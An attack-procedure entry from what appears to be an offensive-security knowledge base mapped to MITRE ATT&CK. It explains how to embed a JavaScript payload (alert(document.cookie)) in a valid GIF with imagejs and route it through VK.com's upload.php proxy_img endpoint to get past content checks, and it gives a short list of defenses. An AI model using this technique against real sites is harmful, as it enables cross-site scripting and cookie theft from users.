---
id: proc-vk-image-craft-001
tags:
  - imagejs
  - js-embedding
type: procedure
tools:
  - '[[tools/imagejs]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:34.007Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-Malicious-Image-with-ImageJS

## Summary

This procedure uses imagejs to embed malicious JavaScript into a valid image file, which is then proxied through VK.com's upload.php?act=proxy_img to return executable JS, bypassing content checks.

## Description

Embed JS payload (e.g., alert(document.cookie)) into a GIF like pikachu.gif using imagejs, ensuring the image remains valid. Proxy the image URL via https://pu.vk.com/c539421/upload.php?act=proxy_img&url=... to control the POST response evaluated by the server, evading sanitization and hash validations.

## Requirements

1. Installed imagejs tool
2. Valid image file (e.g., GIF)
3. Target proxy endpoint access

## Defense

Defensive measures and detection strategies:

- Sanitize proxied content for JS
- Validate image MIME types strictly

## Objectives

1. Create JS-embedded valid image
2. Proxy to return JS payload
3. Confirm execution potential

## Instructions

### Step 1: Embed JS with ImageJS

**Context**: Inject JS into image while keeping it valid.

Use imagejs: imagejs -i pikachu.gif -o malicious.gif "alert(document.cookie);"

> Expected output: malicious.gif that displays as image but executes JS when interpreted as script.

### Step 2: Proxy the Image

**Context**: Serve via VK proxy for POST control.

Construct URL: https://pu.vk.com/c539421/upload.php?act=proxy_img&url=https://example.com/malicious.gif with valid hash.

> Expected output: Proxy returns JS content for eval.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/imagejs]]

## Tags

- imagejs
- js-embedding
